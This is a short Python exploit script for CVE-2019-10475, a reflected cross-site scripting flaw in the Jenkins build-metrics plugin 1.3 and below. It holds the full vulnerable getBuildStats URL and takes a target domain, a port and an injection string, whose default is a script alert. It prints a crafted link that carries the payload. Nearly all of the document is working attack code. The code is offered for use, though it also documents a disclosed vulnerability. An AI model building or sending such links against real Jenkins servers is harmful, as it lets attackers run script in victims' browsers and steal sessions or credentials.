# Exploit Author: vesche (Austin Jackson)
# Vendor Homepage: https://plugins.jenkins.io/build-metrics
# Version: Jenkins build-metrics plugin 1.3 and below
# Tested on: Debian 10 (Buster), Jenkins 2.203 (latest 2019-11-05), and build-metrics 1.3
# CVE: CVE-2019-10475
# Write-up: https://github.com/vesche/CVE-2019-10475

#!/usr/bin/env python

import sys
import argparse

VULN_URL = &#039;&#039;&#039;{base_url}/plugin/build-metrics/getBuildStats?label={inject}&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search&#039;&#039;&#039;


def get_parser():
    parser = argparse.ArgumentParser(description=&#039;CVE-2019-10475&#039;)
    parser.add_argument(&#039;-p&#039;, &#039;--port&#039;, help=&#039;port&#039;, default=80, type=int)
    parser.add_argument(&#039;-d&#039;, &#039;--domain&#039;, help=&#039;domain&#039;, default=&#039;localhost&#039;, type=str)
    parser.add_argument(&#039;-i&#039;, &#039;--inject&#039;, help=&#039;inject&#039;, default=&#039;<script>alert("CVE-2019-10475")</script>&#039;, type=str)
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    port = args[&#039;port&#039;]
    domain = args[&#039;domain&#039;]
    inject = args[&#039;inject&#039;]
    if port == 80:
        base_url = f&#039;http://{domain}&#039;
    elif port == 443:
        base_url = f&#039;https://{domain}&#039;
    else:
        base_url = f&#039;http://{domain}:{port}&#039;
    build_url = VULN_URL.format(base_url=base_url, inject=inject)
    print(build_url)
    return 0


if __name__ == &#039;__main__&#039;:
    sys.exit(main())

